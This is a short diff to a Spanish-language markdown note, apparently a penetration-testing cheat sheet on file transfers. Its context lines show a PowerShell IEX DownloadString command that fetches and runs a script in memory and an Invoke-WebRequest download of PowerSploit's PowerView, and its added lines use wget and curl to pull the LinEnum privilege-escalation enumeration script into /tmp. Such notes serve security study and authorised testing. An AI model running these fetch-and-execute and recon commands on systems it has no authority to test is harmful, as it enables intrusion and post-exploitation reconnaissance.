@@ -15,3 +15,13 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 
 Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
 ```
+
+# Descargas Web con Wget y Curl: Linux
+
+## Descarga de archivo usando wget y curl
+
+```bash
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+```
